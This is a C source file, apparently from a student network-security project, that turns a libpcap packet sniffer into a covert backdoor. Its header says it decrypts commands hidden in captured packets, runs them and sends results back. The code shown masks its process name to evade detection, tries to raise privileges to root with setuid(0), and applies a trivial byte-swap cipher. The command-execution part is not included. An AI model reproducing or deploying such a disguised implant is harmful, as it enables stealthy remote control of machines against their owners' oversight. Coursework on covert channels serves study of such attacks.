/*---------------------------------------------------------------------------------------------
	--	SOURCE FILE:	pkt_sniffer.c -   A simple but complete packet capture
	--					program that will capture and parse datagrams
	--
	--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
	--					filter (BPF)
	--
	--	DATE:			April 23, 2006
	--
	--	REVISIONS:		(Date and nic_description)
	--
	--				March 29, 2011
	--				Fixed memory leak - no more malloc
	--
	--				April 26, 2011
	--				Fixed the pcap_open_live function issues
	--				Use the pcap_lookupnet function before using pcap_open_live
	--
	--				April 10, 2014
	--				Added TCP header processing in proc_hdrs.c
	--
	--
	--	DESIGNERS:		Based on the code by Martin Casado, Aman Abdulla
	--					Code was also taken from tcpdump source, namely from the following files:
	--					print-ether.c
	--					print-ip.c
	--					ip.h
	--					Modified & redesigned: Aman Abdulla: 2006, 2014, 2016
	--
	--	PROGRAMMER:		John Warren
	--
	--	NOTES:
	--	The program will selectively capture a specified number packets using a specified filter
	--	The program will parse the headers and print out selected fields of interest.
	--  The program will decrypt and then handle the instructions in the payload
	--  Once it has handled the instructions, it will send the results as specified in the payload
	---
	--	Compile:
	--		Use the Makefile provided
	--	Run:
	--		./pkt_sniffer 5 "udp and port 53" - for the purpose of testing
	--		alternately it would run undisturbed until receiving a halt command
	--		perhaps using ./pkt_sniffer 0 {activation filter, as above}
	--		but an internal command could be added in place of the shell request
	--
	-------------------------------------------------------------------------------------------------*/
	#include "../shared/pkt_sniffer.h"

// Function Prototypes
// void pkt_callback (u_char*, const struct pcap_pkthdr*, const u_char*);

int main (int argc,char **argv){
	char *nic_dev, *filt=FILTER;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* nic_descr;
	struct bpf_program fp;      // holds compiled program
	bpf_u_int32 maskp;          // subnet mask
	bpf_u_int32 netp;           // ip
	u_char* args = NULL;
	pcap_if_t *iflp;
	int res;

	// Get a list of interfaces
	res = pcap_findalldevs (&iflp, errbuf);
	if (res == -1){fprintf(stderr, "%s\n", errbuf);exit(1);}

	nic_dev = iflp->name;
   // Display the first system interface
	if (nic_dev == NULL){printf("%s\n",errbuf);exit(1);}

    // Use pcap to get the IP address and subnet mask of the device
	pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);
	if (nic_dev == NULL){printf("%s\n",errbuf);exit(1);}

	// open the device for packet capture & set the device in promiscuous mode
	nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
	if (nic_descr == NULL){printf("pcap_open_live(): %s\n",errbuf); exit(1); }
	// printf("%x\n",nic_descr);

	// Compile the filter expression
	if (pcap_compile (nic_descr, &fp, filt, 0, netp) == -1){ fprintf(stderr,"Error calling pcap_compile\n"); exit(1); }

	// Load the filter into the capture device
	if (pcap_setfilter (nic_descr, &fp) == -1){ fprintf(stderr,"Error setting filter\n"); exit(1); }

	psmask(argv[0]); // disguise the app

    // Start the capture session
	pcap_loop (nic_descr, 20, pkt_callback, args);

	fprintf(stdout,"\nCapture Session Done\n");
	return 0;
}

void psmask(char *prog){
	/* mask the process name */
	memset(prog, 0, strlen(prog));
	strcpy(prog, MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);

	/* change the UID/GID to 0 (raise privs) */
	setuid(0);
	setgid(0);
}

// reuse the old swapIN 'encryption' function
unsigned char swapIN(unsigned char x){
    // my cheap form of encryption
     return ( (~x & 0x0F)<<4 | (~x & 0xF0)>>4 );
}

int cryptIN(char *infile, char * outfile){

    //    printf("Decoding using... %s password\n", pass);

    FILE * ifp, *ofp;
    int maxSz=0, fsz = 0,i;
    char inbuf[BUFFSIZE],outbuf[BUFFSIZE];
    size_t bytes;

    ifp = fopen(infile,"rb");
    if (!ifp){
        printf("File does not exist - %s", infile);
        return -1;
    } else if (ifp==0){
        printf("Could not open - %s", infile);
        return 0;
    } else if (ifp== NULL){
        printf("Could not create - %s", infile);
     } else{
    //        printf("Created - %s\n", infile);
    }

    ofp = fopen(outfile,"wb");
    if (!ofp){
        printf("File does not exist - %s", outfile);
        return -1;
    } else if (ofp==0){
        printf("Could not open - %s", outfile);
        return 0;
    } else if (ofp== NULL){
        printf("Could not create - %s", outfile);
    }else {
    //       printf("Created - %s\n", outfile);
    }

    while ((bytes = fread(inbuf, 1, BUFFSIZE, ifp)) != 0) {
        for(i=0;i<bytes;i++){
            outbuf[i]=swapIN(inbuf[i]);
        }

        if(fwrite(outbuf, 1, bytes, ofp) != bytes) {
            return 1;                                           // or other action
        }
    }


    // close loadfile
    fclose(ifp);

    // close coverfile
    fclose(ofp);

    // success
    return 1;
}
